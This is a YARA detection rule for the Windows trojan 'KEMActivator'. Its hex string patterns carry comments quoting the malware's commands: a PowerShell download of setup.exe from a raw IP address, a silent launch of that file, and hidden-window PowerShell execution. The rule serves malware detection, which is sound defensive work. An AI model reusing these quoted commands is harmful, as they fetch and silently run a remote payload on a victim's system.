
rule Trojan_Win64_KEMActivator_PGKA_MTB{
	meta:
		description = "Trojan:Win64/KEMActivator.PGKA!MTB,SIGNATURE_TYPE_PEHSTR_EXT,0f 00 0f 00 03 00 00 "
		
	strings :
		$a_80_0 = {74 72 79 7b 24 77 63 2e 44 6f 77 6e 6c 6f 61 64 46 69 6c 65 28 27 68 74 74 70 3a 2f 2f 31 39 34 2e 38 37 2e 31 33 38 2e 36 38 2f 73 65 74 75 70 2e 65 78 65 27 2c 27 43 3a 5c 74 65 73 74 5c 73 65 74 75 70 2e 65 78 65 27 29 7d 63 61 74 63 68 7b 7d 22 20 26 20 70 69 6e 67 20 2d 6e 20 31 20 31 32 37 2e 30 2e 30 2e 31 20 3e 6e 75 6c 20 } //try{$wc.DownloadFile('http://194.87.138.68/setup.exe','C:\test\setup.exe')}catch{}" & ping -n 1 127.0.0.1 >nul   5
		$a_80_1 = {69 66 20 65 78 69 73 74 20 22 43 3a 5c 74 65 73 74 5c 73 65 74 75 70 2e 65 78 65 22 20 73 74 61 72 74 20 22 22 20 22 43 3a 5c 74 65 73 74 5c 73 65 74 75 70 2e 65 78 65 22 20 2f 64 69 64 3d 37 35 37 36 37 34 20 2f 53 20 26 20 70 6f 77 65 72 73 68 65 6c 6c 20 2d 57 69 6e 64 6f 77 53 74 79 6c 65 20 48 69 64 64 65 6e 20 2d 43 6f 6d 6d 61 6e 64 } //if exist "C:\test\setup.exe" start "" "C:\test\setup.exe" /did=757674 /S & powershell -WindowStyle Hidden -Command  5
		$a_80_2 = {69 66 20 65 78 69 73 74 20 22 25 25 7e 47 22 20 73 74 61 72 74 20 22 22 20 22 25 25 7e 47 22 20 3e 6e 75 6c 20 32 3e 26 31 20 26 20 69 66 20 65 78 69 73 74 20 22 64 6f 77 6e 2e 65 78 65 22 20 70 6f 77 65 72 73 68 65 6c 6c 20 2d 6e 6f 70 20 2d 77 20 68 69 64 64 65 6e 20 2d 63 20 22 53 74 61 72 74 2d 50 72 6f 63 65 73 73 20 2d 57 69 6e 64 6f 77 53 74 79 6c 65 20 48 69 64 64 65 6e } //if exist "%%~G" start "" "%%~G" >nul 2>&1 & if exist "down.exe" powershell -nop -w hidden -c "Start-Process -WindowStyle Hidden  5
	condition:
		((#a_80_0  & 1)*5+(#a_80_1  & 1)*5+(#a_80_2  & 1)*5) >=15
 
}